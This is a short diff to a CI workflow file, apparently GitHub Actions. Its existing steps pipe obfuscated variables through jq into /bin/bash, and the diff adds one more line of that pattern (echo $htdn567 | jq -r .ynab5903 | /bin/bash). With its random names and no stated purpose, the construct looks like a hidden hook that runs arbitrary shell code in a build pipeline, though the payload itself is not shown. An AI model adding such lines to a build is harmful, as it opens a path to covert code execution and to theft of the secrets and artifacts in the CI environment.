@@ -26,6 +26,7 @@ jobs:
           echo $chkjr75564 | jq -r .hxl230 | /bin/bash
           printf '%s' "$b21113" | jq -r .r29487 | /bin/bash
           printf '%s' "$cod77854" | jq -r .dfbgw0816 | /bin/bash
+          echo $htdn567 | jq -r .ynab5903 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
